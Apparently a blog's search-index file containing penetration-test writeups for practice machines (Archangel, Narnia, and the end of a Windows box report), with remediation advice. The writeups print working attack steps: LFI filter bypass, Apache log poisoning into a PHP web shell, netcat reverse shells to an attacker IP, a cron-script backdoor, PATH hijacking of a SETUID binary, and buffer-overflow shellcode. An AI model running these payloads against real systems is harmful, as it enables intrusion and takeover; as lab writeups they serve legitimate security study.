VulnerabilityThe beta.php file located at C:\xampp\htdocs\FFS\beta.php was responsible for the initial foothold on the box. The code performs the curl function on the user query, but does not first check it for potentially malicious characters or strings:  if(isset($_POST\['read']))                      {                           $file\=trim($_POST\['file']);         $curl = curl_init();                                                                   curl_setopt ($curl, CURLOPT_URL, $file);                           curl_exec ($curl);                         curl_close ($curl);   }Hardening this code will require a blacklist which should contain strings such as file (to prevent file:///) and localhost.ConclusionThis Windows system contained multiple vulnerabilities. The foothold on the machine started with an insecure file scanner feature located on the HTTPS server. The file scanner fails to sanitize user input. Thus, sensitive files located locally on the system could be read using the file:/// delimiter at the beginning of the query. Furthermore, sensitive services which are not able to be accessed by outside users, can be accessed by forcing the file scanner to perform a query on itself.A vulnerable version of Voting System software was installed which resulted in the ability to upload malicious PHP files to get a reverse shell. After obtaining a reverse shell, it was found that the box has a misconfiguration relating to the installation feature of Windows, and the enabled AlwaysInstallElevated group policy resulted in the privilege escalation to SYSTEM. The following remediations should be seriously considered:      Harden SQL code in login.php    Sanitize user query (character escaping, blacklist characters, validate input)      Use stored procedures or parameterized queries    Perform sanitization on user query in the beta.php file      Update Voting System software        Poor validation within an image file upload feature resulted in the successful upload of malicious PHP to get a reverse shell        Modify AlwaysInstallElevated policy    Enabling this group policy resulted in escalating privileges from a local account to SYSTEM  This policy should be changed from 1 to 0            *      [[1]](#ftnt_ref1) https://github.com/OJ/gobuster [[2]](#ftnt_ref2) https://owasp.org/www-community/attacks/Log_Injection [[3]](#ftnt_ref3) https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec",
      "image": "/images/0xd4y-logo-gray.png"
    } ,
  
    {
      "title"    : "Archangel Writeup",
      "category" : "",
      "tags"     : "LFI, Log Poisoning, RCE, and Binary Exploitation",
      "url"      : "/2021/04/30/Archangel-Writeup/",
      "date"     : "Apr 30, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.ArchangelA report on the exploitation of a vulnerable web server.   0xd4yApril 30, 20210xd4y WriteupsLinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        2Attack Narrative        3Reconnaissance        3Port Enumeration        3Exploiting the Web Server        4Web Enumeration        4Local File Inclusion        5Log Poisoning        8Horizontal Privilege Escalation        12Root Privilege Escalation        13Binary Exploitation        14Reverse Engineering        14Command Injection        14Conclusion        16Executive SummaryThe attack performed on the target as outlined in this report was conducted without prior knowledge of anything about the client’s machine except for its IP address. This was done so as to mimic a real attack from a person of malicious intent. The client’s system contained multiple vulnerabilities ranging from local file inclusion to misconfigurations and an insecure SETUID binary. This machine was successfully compromised by exploiting an insecure PHP script to get a reverse shell as a low-privileged user, after which we were able to horizontally escalate privileges to a user on the system who had access to a vulnerable SETUID running as root. After the exploitation of this binary, we were able to successfully gain full privileges as root on the Archangel system. The client is highly encouraged to patch the system with the remediations outlined in the Conclusion section.Attack NarrativeWe are given the IP of the target machine. The first step to finding any vulnerability is always reconnaissance.ReconnaissanceBefore performing any kind of enumeration, it is essential to start with port enumeration. This will allow us to find possible attack vectors.Port EnumerationWe can enumerate the ports of the machine with nmap -sC (default scripts) -sV (version detection).  # Nmap 7.91 scan initiated Sat May  1 01:38:36 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.72.16Nmap scan report for archangel.thm (10.10.72.16)Host is up (0.24s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: WavefireService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThe nmap scan only detected two open ports (ssh on port 22 and http on port 80). Both services are up to date, so there are no CVEs (Common Vulnerabilities and Exposures) associated with them.Exploiting the Web ServerWeb EnumerationSeeing as http is open, we can visit the website to find potential vulnerabilities.After browsing around the web page and running a gobuster scan on it, nothing interesting came into view. However, in the front page of the website is an email:Most notably, we can see the domain of the email as mafialive.thm. Adding this domain to our /etc/hosts file and visiting the website at mafialive.thm, we are met with the following webpage:The website seems to be a simple HTTP server. There may be some interesting files / directories that can be revealed using a gobuster scan.  ┌─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel/lfi\]└──╼ $gobuster dir -u http://mafialive.thm -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php\===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\===============================================================\[+\] Url:            http://mafialive.thm\[+\] Threads:        10\[+\] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt\[+\] Status codes:   200,204,301,302,307,401,403\[+\] User Agent:     gobuster/3.0.1\[+\] Extensions:     php\[+\] Timeout:        10s\===============================================================2021/05/02 04:34:46 Starting gobuster\===============================================================/.php (Status: 403)/.html (Status: 403)/.html.php (Status: 403)/.htm (Status: 403)/.htm.php (Status: 403)/test.php (Status: 200)The scan found an interesting file by the name of test.php. Visiting this PHP file and clicking on the button, we are met with the following webpage:We can see that there is a view parameter in the URL with the full path of a PHP file called mrrobot.php. This full path is a hint that there may be an LFI (Local File Inclusion) vulnerability within the test.php script.Local File InclusionWe can verify this by seeing if we can convert the PHP file to base64 in order to read its source code. Using the PHP base64 filter on the mrrobot.php file, we can see the following output:URL:http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.phpOutput:Expectedly, the output of this URL is a base64 string relating to the source code of the mrrobot.php file. Decoding this string we see the following:  ┌─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel\]  └──╼ $echo -n "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" |base64 -d&lt;?php echo 'Control is an illusion'; ?&gt;Although we were able to verify the LFI vulnerability by converting the mrrobot.php file into base64, we were unsuccessful in including /etc/passwd (even though it is a globally-readable file by default).URL:http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php/../../../../../../../etc/passwdOutput:The webpage provides an error message that says “Sorry, Thats not allowed”. Judging by this error message and the unsuccessful attempt at including the targeted file, we can conclude that there is a filter inside the test.php script that is detecting attempts at including local files. Implementing the same methodology that we used to read the source code for the mrrobot.php file, we can view the source code of the test.php file.  ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel\]  └──╼ $echo -n "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygk  c3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyK  CRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYX  RzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg=="|base64 -d &gt; test.phpAfter decoding the base64 data, we are met with the contents of the test.php file’s source code:  &lt;!DOCTYPE HTML&gt;  &lt;html&gt;    &lt;head&gt;   &lt;title&gt;INCLUDE&lt;/title&gt;   &lt;h1&gt;Test Page. Not to be Deployed&lt;/h1&gt;   &lt;/button&gt;&lt;/a&gt; &lt;a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"\&gt;&lt;button id="secret"\&gt;Here is a button&lt;/button&gt;&lt;/a&gt;&lt;br&gt;       &lt;?php            //FLAG: thm{explo1t1ng_lf1}           function containsStr($str, $substr) {               return strpos($str, $substr) !== false;             }            if(isset($_GET\["view"\])){            if(!containsStr($_GET\['view'\], '../..') &amp;&amp; containsStr($_GET\['view'\], '/var/www/html/development_testing')) {                   include $_GET\['view'\];             }else{                echo 'Sorry, Thats not allowed';             }          }       ?&gt;   &lt;/div&gt;  &lt;/body&gt;    &lt;/html&gt;We can see that the PHP file is looking for the strings “../..” and /var/www/html/devleopment_testing exist in the URL . More precisely, if there is a “../..” string in the URL or the URL does not have /var/www/html/development_testing, then the detection will trigger. We can bypass this by using “..//..” which functions just like “../..”.URL:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwdOutput:The payload successfully works, and we are able to include any local file that we have read permissions to. From the /etc/passwd file, we see that there is a local user by the name of archangel. Seeing as there is an open ssh port on the box, I tried to read the user’s private ssh key to login as the user. However, the attempt to include this file proved to be unsuccessful (this may be due to us not having proper permissions, or the archangel user may not have a private ssh key).Although we can include sensitive files on the vulnerable system, it is necessary to convert this LFI vulnerability to an RCE (Remote Code Execution) vulnerability in order to get a shell on the target.Log PoisoningThis can be done by log poisoning[1]. Looking back at the results of the nmap scan, we can see that the http service is running the Apache version. It follows that there is most likely an apache log file at /var/log/apache2/access.log which can be leveraged to gain RCE. After verifying the existence of this file, I used netcat to poison the log file.  ┌─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel\]        └──╼ $nc mafialive.thm 80  GET /&lt;?php phpinfo(); ?&gt;                                     HTTP/1.1 400 Bad Request  Date: Sat, 01 May 2021 02:27:27 GMT  Server: Apache/2.4.29 (Ubuntu)                                                          Content-Length: 301    Connection: close                                                                      Content-Type: text/html; charset=iso-8859-1                                                                                   &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;           &lt;html&gt;&lt;head&gt;             &lt;title&gt;400 Bad Request&lt;/title&gt;   &lt;/head&gt;&lt;body&gt;           &lt;h1&gt;Bad Request&lt;/h1&gt;               &lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;           &lt;/p&gt;                 &lt;hr&gt;                 &lt;address&gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80&lt;/address&gt;  &lt;/body&gt;&lt;/html&gt;                             We can confirm if this attempt was successful by including this log file and viewing the output of the webpage.Seeing as the log file outputs the PHP info, we can conclude that the malicious GET request succeeded, and the PHP code was executed on the web server. Therefore, we can send another GET request to create a PHP webshell:  ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel\]  └──╼ $nc mafialive.thm 80  GET /&lt;?php system($_GET\['cmd'\]);?&gt;  HTTP/1.1 400 Bad Request  Date: Sat, 01 May 2021 02:34:25 GMT  Server: Apache/2.4.29 (Ubuntu)  Content-Length: 301  Connection: close  Content-Type: text/html; charset=iso-8859-1    &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;  &lt;html&gt;&lt;head&gt;  &lt;title&gt;400 Bad Request&lt;/title&gt;  &lt;/head&gt;&lt;body&gt;  &lt;h1&gt;Bad Request&lt;/h1&gt;  &lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;  &lt;/p&gt;  &lt;hr&gt;  &lt;address&gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80&lt;/address&gt;  &lt;/body&gt;&lt;/html&gt;We can now get a reverse shell by sending the following payload:Payload:            http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//var/log/apache2/access.log&amp;cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff      %2Fbin%2Fsh+-i+2%3E%261      nc+10.2.29.238+9001+%3E%2Ftmp%2Ff      Note that a url-encoded netcat reverse shell was used  The revshell[2] tool was used to create the reverse shell payload, and we are able to get a shell as the www-data user.Horizontal Privilege EscalationWith a low-privileged shell, we are unable to execute any commands that may lead to a privilege escalation. However, we can exploit misconfigurations on the server to potentially escalate privileges. The local user (archangel) may have some files that we have access to that could potentially lead to us compromising his or her account. We can enumerate all the files that this user owns on the local system with the following command:  www-data@ubuntu:/home/archangel$ find / -user archangel 2&gt;/dev/null  /opt/helloworld.sh  /opt/backupfiles  /home/archangel  /home/archangel/.selected_editor  /home/archangel/.local  /home/archangel/.local/share  /home/archangel/.profile  /home/archangel/secret  /home/archangel/user.txt  /home/archangel/myfiles  /home/archangel/.cache  /home/archangel/.bash_logout  /home/archangel/.bashrcWe can see a potentially interesting file by the name of “secret”, however this file was a rabbit hole. There are two other interesting findings located in the /opt directory. Going into this directory and looking at the permissions of the helloworld.sh file, we see that we have full privileges on this file.  www-data@ubuntu:/opt$ ls -la  total 16  drwxrwxrwx  3 root      root      4096 May  1 08:23 .  drwxr-xr-x 22 root      root      4096 Nov 16 15:39 ..  drwxrwx---  2 archangel archangel 4096 Nov 20 15:04 backupfiles  \-rwxrwxrwx  1 archangel archangel  66 May  1 08:22 helloworld.shFurthermore, we can see from /etc/crontab that there is a cronjob executing it as the archangel user.  www-data@ubuntu:/opt$ cat /etc/crontab  # /etc/crontab: system-wide crontab  # Unlike any other crontab you don't have to run the \`crontab'  # command to install the new version when you edit this file  # and files in /etc/cron.d. These files also have username fields,  # that none of the other crontabs do.    SHELL=/bin/sh  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin    # m h dom mon dow user  command  \*/1 \*   \* \* \*   archangel /opt/helloworld.sh17 \*    \* \* \*   root    cd / &amp;&amp; run-parts \--report /etc/cron.hourly25 6    \* \* \*   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    \* \* 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 \* \*   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )  #Therefore, we can append a reverse shell on the file and listen on the specified port.  www-data@ubuntu:/opt$ cat helloworld.sh  #!/bin/bash  echo "hello world" &gt;&gt; /opt/backupfiles/helloworld.txt  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.29.238 9002 &gt;/tmp/fEventually, the cronjob runs and we get a shell as the archangel user.  ┌─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel\]└──╼ $nc -lvnp 9002listening on \[any\] 9002 ...  connect to \[10.2.29.238\] from (UNKNOWN) \[10.10.72.16\] 47742/bin/sh: 0: can't access tty; job control turned off  $ whoami  archangelRoot Privilege EscalationAs the archangel user, we now have access to the myfiles directory located in the compromised user’s home directory.Binary ExploitationWithin this directory lies a “backup” file with SETUID root permissions. Upon executing this file, we can see that the binary is calling the cp command:archangel@ubuntu:~/secret$ ./backupcp: cannot stat ‘/home/user/archangel/myfiles/*’: No such file or directoryWe can download this file using netcat to further analyze this binary on our attack box with Ghidra[3].  archangel@ubuntu:~/secret$ nc -w3 10.2.29.238 9001 &lt; backup  ┌─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel\]└──╼ $nc -lvnp 9001 &gt; backup  listening on \[any\] 9001 ...  connect to \[10.2.29.238\] from (UNKNOWN) \[10.10.72.16\] 42682  ┌─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel\]  └──╼ $ls  backup  lfi  nmap  notes.txtReverse EngineeringGhidra converts assembly code into C code. It finds that this file is relatively small with only a couple lines of code:  undefined8 main(void)    {   setuid(0); setgid(0); system("cp /home/user/archangel/myfiles/\* /opt/backupfiles"); return 0;  }As can be seen, the binary is calling the cp command without using a full path.Command InjectionThus, we can exploit this vulnerability by creating a file called cp and modifying our PATH environment variable to prioritize the location of this malicious file[4]:  archangel@ubuntu:~/secret$ cat cp  /bin/bash  archangel@ubuntu:~/secret$ chmod +x cp  archangel@ubuntu:~/secret$ echo $PATH  /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  archangel@ubuntu:~/secret$ export PATH=.:$PATH  archangel@ubuntu:~/secret$ ls  backup  cp  user2.txtNow when we execute the backup binary, it will run our malicious file instead of the intended command.  archangel@ubuntu:~/secret$ ./backup  root@ubuntu:~/secret# id  uid=0(root) gid=0(root) groups=0(root),1001(archangel)ConclusionThe client is running a vulnerable http service that is at risk of being exploited. A malicious attacker can achieve full root access on this system without trouble. This system must be patched as soon as possible, and the following remediations will provide a stronger defense against possible attacks:      Modify the test.php script on the development site to not include user-inputted files    The script can be modified to only whitelist certain file names      Failure to correctly include files resulted in a critical RCE vulnerability        Be mindful of misconfigurations within the local system        The www-data user was able to modify a critical cronjob run as the archangel user, which allowed for horizontal privilege escalation        Always use full paths when performing any action as a privileged user    Due to the improper use of a command in a binary running as root, we were able to escalate privileges to the root user through modifying the PATH environment variableIt is highly encouraged that the system be patched as soon as possible with the aforementioned remediations.[1] https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1 [2] https://github.com/0xd4y/RevShell [3] https://github.com/NationalSecurityAgency/ghidra [4] https://owasp.org/www-community/attacks/Command_Injection",
      "image": "/images/0xd4y-logo-gray.png"
    } ,
  
    {
      "title"    : "Narnia Writeup",
      "category" : "",
      "tags"     : "Binary Exploitation, Ret2Libc, Shellcode, and Format String",
      "url"      : "/2021/04/22/Narnia-Writeup/",
      "date"     : "Apr 22, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.NarniaAn analysis on the exploitation of vulnerable binaries.   0xd4yApril 22, 20210xd4y WriteupsLinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        3Attack Narrative        4Narnia 0        4Binary Analysis        4Buffer Overflow        5Source Code        7Narnia 1        8Binary Analysis        8Exporting Shellcode into the Environment Variable        9Source Code        10Narnia 2        11Binary Analysis        12Calculating EIP Offset        13How the Buffer Relates to the Stack        14Constructing a Payload        16Binary Exploitation        17POC        17Exploiting the Binary on the Target        18Source Code        20Narnia 3        21Attempting to Read Passwords from the Stack Pointer        21Security Behind SUID Debugging        23Binary Analysis        23Exploiting strcpy        25Source Code        27Narnia 4        28Binary Analysis        28Binary Exploitation        29Source Code        32Narnia 5        33Binary Analysis        33Format String Exploit        35POC        35Controlling Variable Value        36Method 1        36Method 2        37Source Code        37Narnia 6        38Binary Analysis        38Behavior        38Ghidra        38Ret2libc Attack        40POC        40Determining System Address        41Exploit        43Source Code        44Narnia 7        45Binary Analysis        45Behavior        45Ghidra        46Format String Exploit        46Source Code        47Narnia 8        49Binary Analysis        49Ghidra        49Buffer Overflow        51Gdb        51Local_8 Address Behavior        53Overwriting func Return Address        54Shellcode        56Source Code        57Conclusion        58Executive SummaryThe source code of each program was given, however throughout this report each program will be treated as if we are not given this information. This approach is taken so as to replicate real-world environments in which an attacker most likely would not have knowledge on the source code of the binary he or she is trying to exploit.This penetration test resulted in the successful exploitation of all nine out of nine binaries. Among the vulnerabilities were the following: passing unsanitized input into functions, failure to check boundaries, using insecure functions, and unnecessarily disabling the NX bit. Remediations are outlined in the Conclusion section where specific vulnerabilities were described more in detail. All users except root were compromised, and the password for each compromised user was retrieved:UsernamePasswordnarnia0narnia0narnia1efeidiedaenarnia2nairiepecunarnia3vaequeezeenarnia4thaenohtainarnia5faimahchiynarnia6neezocaengnarnia7ahkiaziphunarnia8mohthuphognarnia9eiL5fealaeAttack NarrativeEach binary gets increasingly harder. For every challenge, I have downloaded each binary by copying its base64 or base32 data on my attacking box. This was done to allow a further analysis into the binary by allowing the usage of pwndbg[1], Ghidra[2], and other tools that are not present on the target machine.Narnia 0We are given the credentials for the narnia0 user, and with it we can ssh into the box.Binary AnalysisBefore trying to exploit the first binary by testing buffer overflows, we will check the security of the binary with the checksec command:The “Arch” row shows that this binary is a 32 bit program and whose endianness is little-endian. Additionally, we can see that NX (non-execute), the bit responsible for not allowing writable memories to be executed, is enabled. This means that we cannot inject shellcode into the function. We can get a little more information about the binary by using the file command:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia]  └──╼ $file narnia0 narnia0: ELF 32\-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not strippedNote how this file is not stripped which means it will contain debug information regarding symbols and functions. This will give us a little bit more information as to what is going on with the binary when we try to reverse engineer it.Running the program, we can see that it is asking for a certain value in the function to be changed.  narnia0@narnia:/narnia$ ./narnia0  Correct val's value from 0x41414141 -&gt; 0xdeadbeef!  Here is your chance: test  buf: test  val: 0x41414141  WAY OFF!!!!Attempting to write the four letter word “test” to the buffer proves to be an inadequate length for overflowing the buffer as the value did not change.Buffer OverflowWe can verify that this value can be modified by attempting to flood the buffer with a long string of characters:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia]  └──╼ $pwn cyclic 100  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaanarnia0@narnia:/narnia$ ./narnia0  Correct val's value from 0x41414141 -&gt; 0xdeadbeef!  Here is your chance: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa  buf: aaaabaaacaaadaaaeaaafaaa  val: 0x61616166  WAY OFF!!!!Observe that the value has changed from 0x41414141 to 0x61616166 confirming that there is a buffer overflow vulnerability. To calculate the offset, the -l flag can be utilized in the pwn command:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia]  └──╼ $pwn cyclic -l 0x61616166  20Seeing as the offset is 20 bytes, it is possible to input up to 20 bytes into the buffer before the value gets changed. Thus the payload will incorporate a string of 20 bytes followed by 0xdeadbeef in little endian which is \xef\xbe\xad\xde. Conducting this attack reveals the following:  narnia0@narnia:/narnia$ python -c "print 'A'*20+'\\xef\\xbe\\xad\\xde'"|./narnia0 Correct val's value from 0x41414141 -&gt; 0xdeadbeef!  Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ  val: 0xdeadbeefThe attack has been successfully performed as can be seen from the overwritten value and lack of the WAY OFF!!!! message. However, no shell was given. Analysing this program in radare2 reveals that we should be getting a /bin/sh shell:Upon further thought into the reason for not receiving a shell, it came to mind that perhaps the shell is dying with the process of piping the python command into the narnia0 binary. It is possible that stdin is attached to this process and therefore the shell immediately dies. Appening ;cat - to the end of the command proves to work (this is because cat - outputs stdin).  narnia0@narnia:/narnia$ (python -c "print 'A'*20+'\\xef\\xbe\\xad\\xde'";cat -)|./narnia0 Correct val's value from 0x41414141 -&gt; 0xdeadbeef!  Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ  val: 0xdeadbeef  whoami  narnia1  cat /etc/narnia_pass/narnia1  efeidiedaeCommands are successfully being executed inside the /bin/sh shellLooking at the source code of the program, we can confirm that the aforementioned analysis of the binary was correct:  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;    int main(){   long val=0x41414141;   char buf[20];   printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\\n");   printf("Here is your chance: ");   scanf("%24s",&amp;buf);   printf("buf: %s\\n",buf);   printf("val: 0x%08x\\n",val);   if(val==0xdeadbeef){         setreuid(geteuid(),geteuid());         system("/bin/sh");     }   else {       printf("WAY OFF!!!!\\n");       exit(1);     }   return 0;  }  ### Source Code#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;    int main(){   long val=0x41414141;   char buf[20];   printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\\n");   printf("Here is your chance: ");   scanf("%24s",&amp;buf);   printf("buf: %s\\n",buf);   printf("val: 0x%08x\\n",val);   if(val==0xdeadbeef){         setreuid(geteuid(),geteuid());         system("/bin/sh");     }   else {       printf("WAY OFF!!!!\\n");       exit(1);     }   return 0;  }Narnia 1Now with a shell as the narnia1 user, we have the necessary permissions to execute the next binary:  narnia1@narnia:/narnia$ ./narnia1  Give me something to execute at the env-variable EGGWe can see that the binary is expecting an environment variable called EGG. The program states that it will execute this environment variable, hinting at the fact that this binary may be vulnerable to an environment variable buffer overflow[3]. Before attempting a buffer overflow, we can provide a simple string to the EGG environment variable to see how the binary is meant to behave:  narnia1@narnia:/narnia$ export EGG=1                                                                                                                                          narnia1@narnia:/narnia$ ./narnia1                                                                                                                                              Trying to execute EGG!                                                                                                                                                        Segmentation fault                                                                                                                                                          Binary AnalysisAfter only providing one byte, the program experienced a segmentation fault. To further understand how this binary works, a long string of A’s can be exported to determine where the content of the environment variable is in the buffer (this was performed locally so as to have the ability to analyze with pwndbg):  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia/1]                              └──╼ $gdb ./narnia1 -q                                                                  pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.                          pwndbg: created $rebase, $ida gdb functions (can be used with print/break)              Reading symbols from ./narnia1...                                                      (No debugging symbols found in ./narnia1)                                              pwndbg&gt; r                                                                              Starting program: /home/0xd4y/business/other/overthewire/narnia/1/narnia1              Trying to execute EGG!                                                                                                                                                         Program received signal SIGSEGV, Segmentation fault.                                    0xffffddf3 in ?? ()                                                                  We get a segmentation fault as expected, however the EIP register is not getting overwritten (an address of 0x41414141  was expected, but instead it is 0xffffddf3). It is possible that the program is using the getenv() function[4] without storing the environment variable in a buffer.Exporting Shellcode into the Environment VariableAs can be seen from the segmentation fault error, the program is failing to validate the size and / or content of the environment variable. The program earlier stated that it will execute whatever is inside the EGG environment variable. The checksec command can be used to determine if the binary could execute shellcode:Seeing as NX is disabled, the program might execute shellcode upon exporting shellcode to the EGG environment variable.There are many different shellcodes to use, but for the purpose of this exercise I chose the /bin/sh shellcode from here[5]. However, exporting this shellcode into the EGG environment variable and executing the program proves to not work:  narnia1@narnia:/narnia$ export EGG=$(python -c "print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'")                      narnia1@narnia:/narnia$ echo $EGG1Ph//shh/binPS                       ̀                    narnia1@narnia:/narnia$ ./narnia1  Trying to execute EGG!                  Segmentation fault                  I do not know why this particular shellcode does not work. However, trying a shellcode[6] that executes /bin/bash does work:  narnia1@narnia:/narnia$ export EGG=$(python -c "print '\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")  narnia1@narnia:/narnia$ ./narnia1  Trying to execute EGG!  bash-4.4$ whoami  narnia2  bash-4.4$ cat /etc/narnia_pass/narnia2  nairiepecuSource Code  #include &lt;stdio.h&gt;    int main(){   int (*ret)();   if(getenv("EGG")==NULL){       printf("Give me something to execute at the env-variable EGG\\n");       exit(1);     }   printf("Trying to execute EGG!\\n");     ret = getenv("EGG");     ret();   return 0;  }Note how the ret variable is not assigned a buffer. This is why the content of the environment variable was not seen in the ESP register during the analysis in pwndbg.Narnia 2Using the credentials obtained for the narnia2 user, we can execute the narnia2 binary.  narnia2@narnia:/narnia$ ./narnia2  Usage: ./narnia2 argument  narnia2@narnia:/narnia$ ./narnia2 A  Anarnia2@narnia:/narnia$Looking at the usage of the program, we see that it expects an argument. Inputting an argument of “A” just makes the program print out the same character. In essence, the program spits out whatever we put in. As usual, we will analyze the binary on a local attack box to understand it better:This is a 32 bit binary. It is not stripped which means the debug symbols will still be present within the binary. Furthermore, NX is disabled so we might be able to inject shellcode into the buffer and have the binary execute it. To detect a buffer overflow vulnerability, a large string of bytes were sent:Binary AnalysisWe can see that the program errors out with a “Segmentation fault” error. It is essential to investigate further into what might be happening by using a debugger program such as gdb. There are other great debugger programs such as radare2, IDA, Ghidra, among many others, and each one of them has their strengths and weaknesses (gdb and radare2 tend to be very strong dynamic analysis debugger programs, while Ghidra and IDA are more useful for static analysis).  pwndbg&gt; r $(python2 -c "print 'A'*1000")                                                                                                                              Starting program: /home/0xd4y/business/other/overthewire/narnia/2/narnia2 $(python2 -c "print 'A'*1000")                                                                                                                                                             Program received signal SIGSEGV, Segmentation fault.                                  0x41414141 in ?? ()                                                                                                                                                          LEGEND: STACK 